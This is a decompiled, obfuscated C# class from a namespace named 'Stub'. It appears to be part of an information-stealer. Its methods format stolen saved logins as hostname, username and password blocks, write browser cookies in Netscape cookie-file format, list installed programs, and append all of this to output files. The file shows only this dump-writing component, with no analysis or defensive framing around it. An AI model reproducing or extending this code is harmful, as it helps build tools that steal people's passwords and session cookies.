using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200000B RID: 11
	public sealed class Class14
	{
		// Token: 0x06000014 RID: 20 RVA: 0x000029F4 File Offset: 0x00000BF4
		public static string smethod_0(GStruct5 gstruct5_0)
		{
			return string.Concat(new string[]
			{
				"Hostname: ",
				gstruct5_0.String_0,
				"\nUsername: ",
				gstruct5_0.String_1,
				"\nPassword: ",
				gstruct5_0.String_2,
				"\n\n"
			});
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002A4C File Offset: 0x00000C4C
		public static string smethod_1(Struct5 struct5_0)
		{
			return string.Concat(new string[]
			{
				struct5_0.String_0,
				"\tTRUE\t",
				struct5_0.String_2,
				"\tFALSE\t",
				struct5_0.String_3,
				"\t",
				struct5_0.String_1,
				"\t",
				struct5_0.String_5,
				"\r\n"
			});
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000020E2 File Offset: 0x000002E2
		public static string smethod_2(Program struct7_0)
		{
			return string.Format("### {0} ### ({1}) {2}\n", struct7_0.String_1, struct7_0.String_0, struct7_0.Int32_0);
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002AC0 File Offset: 0x00000CC0
		public static string smethod_3(Struct8 struct8_0)
		{
			if (!string.IsNullOrEmpty(struct8_0.String_0))
			{
				return string.Concat(new string[]
				{
					"### ",
					struct8_0.String_1,
					" ### (",
					struct8_0.String_0,
					")\n"
				});
			}
			return "### " + struct8_0.String_1 + " ###\n";
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002B28 File Offset: 0x00000D28
		public static bool smethod_4(List<Struct5> list_0, string String_0)
		{
			bool result;
			try
			{
				foreach (Struct5 struct5_ in list_0)
				{
					File.AppendAllText(String_0, Class14.smethod_1(struct5_));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002B94 File Offset: 0x00000D94
		public static bool smethod_5(List<Program> list_0, string String_0)
		{
			bool result;
			try
			{
				foreach (Program struct7_ in list_0)
				{
					File.AppendAllText(String_0, Class14.smethod_2(struct7_));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002C00 File Offset: 0x00000E00
		public static bool smethod_6(List<Struct8> list_0, string String_0)
		{
			bool result;
			try
			{
				foreach (Struct8 struct8_ in list_0)
				{
					File.AppendAllText(String_0, Class14.smethod_3(struct8_));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002C6C File Offset: 0x00000E6C
		public static bool smethod_7(List<GStruct5> list_0, string String_0)
		{
			bool result;
			try
			{
				foreach (GStruct5 gstruct5_ in list_0)
				{
					if (!(gstruct5_.String_1 == "") && !(gstruct5_.String_2 == ""))
					{
						File.AppendAllText(String_0, Class14.smethod_0(gstruct5_));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
